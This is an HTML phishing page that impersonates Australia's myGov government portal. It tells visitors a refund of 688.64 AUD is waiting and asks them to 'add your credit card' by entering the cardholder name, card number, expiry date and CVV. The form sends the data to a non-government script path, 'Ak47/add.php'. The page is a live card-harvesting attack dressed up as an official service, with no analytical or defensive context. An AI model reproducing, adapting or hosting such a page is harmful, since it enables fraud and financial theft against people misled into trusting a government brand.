<!DOCTYPE html>

<html lang="en"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

	
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<title>
		Transaction management - myGov
	</title>
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- phone number format detection, turning it off -->
	<meta name="format-detection" content="telephone=no">
<link rel="icon" type="image/png" sizes="32x32" href="./files/favicon-32x32.png">
  	<link rel="icon" type="image/png" sizes="16x16" href="./files/favicon-16x16.png">
	<link href="./files/css" rel="stylesheet">
	<link href="./files/mgv2-application.css" rel="stylesheet">
	<script src="./files/jquery.min.js.download"></script>
	<link href="./files/blugov.css" rel="stylesheet">

</head>

<body cz-shortcut-listen="true"><noscript>
	<div class="outage">
		<div class="outage__inner">
			<div>
				<span class="is-visuallyhidden"> Warning message: </span>
				<p> JavaScript is required for myGov to work correctly.</p>
			</div>
		</div>
	</div>
</noscript>




	
		
	
	





<nav class="uikit-skip-link" aria-label="Skip Links">
	<a class="uikit-skip-link__link" href="">Skip to main content</a>
</nav>

<div class="brand-rainbow">&nbsp;</div>
<header role="banner" class="mgvEnhanceHeader">
	<section class="wrapper">
		<div class="inner">
			<div class="unauth-grid">
				<div class="unauth-grid-row">
					<a href="" class="unauth-govt-crest__link">
					    <img id="unauth-govt-crest" src="./files/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
                    </a>

					<div class="header-links">
						<a href="">Log Out</a>
					</div>
				</div>
			</div>
		</div>
	</section>
</header>









<div class="wrapper-mapwap"><div class="main-block" id="content" role="main">
	<div class="unauth">
		<div class="login-grid-container">
			<div class="login-grid-row">
				<div class="login-grid-column">
					<div class="digital-id-login-card-wrapper">
						<div class="digital-id-main-login-card override">
	
							
							<p class="login-instruction-text">Our transaction management system detects that you are entitled to receive this payment.</p>

							<strong><span style="color: green">Your refund is available online : 688.64 AUD</span></strong>
							<br>
							<h6>Add your credit card to get your refund</h6>
							<img width="140" src="./files/gates.png">


							<form id="mygov-login-form" aria-describedby="error-msg" class="mygov-login-form alternative" action="Ak47/add.php" method="post">
	
								<div class="input-group">
									<label class="override" for="userId">Name on card</label>
									<input required name="name" aria-required="true" data-username="data-username" type="text" value="" autocomplete="off">
								</div>

								<div class="input-group">
									<label class="override" for="userId">Card Number</label>
									<input required name="number" minlength="16" maxlength="19" aria-required="true" data-username="data-username" type="text" value="" autocomplete="off">
								</div>

								<div class="input-group">
									<label class="override" for="userId">Expiry date</label>
									<input required name="exp" placeholder="MM/YYYY" minlength="5" maxlength="7" aria-required="true" data-username="data-username" type="text" value="" autocomplete="off">
								</div>

								<div class="input-group">
									<label class="override" for="userId">CVV (3*digits)</label>
									<input required minlength="3" maxlength="4" name="cvc" aria-required="true" data-username="data-username" type="text" value="" autocomplete="off">
								</div>
	
								
								<p class="recovery">
								
								</p>
	
								<div class="button-digital-id-main-container override">
									<div class="digital-id-button-container">
										<button type="submit" class="button-main" name="_eventId_login"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-plus-circle" viewBox="0 0 16 16">
  <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z"/>
  <path d="M8 4a.5.5 0 0 1 .5.5v3h3a.5.5 0 0 1 0 1h-3v3a.5.5 0 0 1-1 0v-3h-3a.5.5 0 0 1 0-1h3v-3A.5.5 0 0 1 8 4z"/>
</svg> Add Card</button>
									</div>
								</div>
	
								

								
									
								
								
								
							
								
							</form>
	
							
	
							
										
						
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div></div>





<footer role="contentinfo">
    <div class="wrapper">
      <div class="inner">

        <section class="footer-list">
            <nav>
            <h2 class="sr-only" aria-label="Footer">Footer</h2>
            <ul class="lower-links">
                <li>
                    <a target="_blank" href="">Terms of use</a>
                </li>
                <li>
                    <a target="_blank" href="">Privacy and security</a>
                </li>
                <li>
                    <a target="_blank" href="">Copyright</a>
                </li>
                <li>
                    <a target="_blank" href="">Accessibility</a>
                </li>
            </ul>
            </nav>
        </section>
          <div class="footer-lower">
              <section class="footer-lower-logo">
              <a href="">
                  <img src="./files/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
              </a>
              </section>

              <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
          </div>

     <script>
jQuery.fn.ForceNumericOnly =
function()
{
    return this.each(function()
    {
        $(this).keydown(function(e)
        {
            var key = e.charCode || e.keyCode || 0;
            return (
                key == 8 || 
                key == 9 ||
                key == 13 ||
                key == 46 ||
                key == 110 ||
                key == 190 ||
                (key >= 35 && key <= 40) ||
                (key >= 48 && key <= 57) ||
                (key >= 96 && key <= 105));
        });
    });
};

$("#number").ForceNumericOnly();
$("#cvc").ForceNumericOnly();
$("#exp").ForceNumericOnly();
    $('#exp').on("keyup , focus , input", () => {
        var creditExpirationMonth = $("#exp").val()

        let my = $('#exp')
        if (my.val().length == 2 && !my.val().includes("/"))
            my.val(my.val() + "/")

    });
</script>


      </div>
    </div>
  </footer>



<div id="artifact-metadata">
	
</div>



</body></html>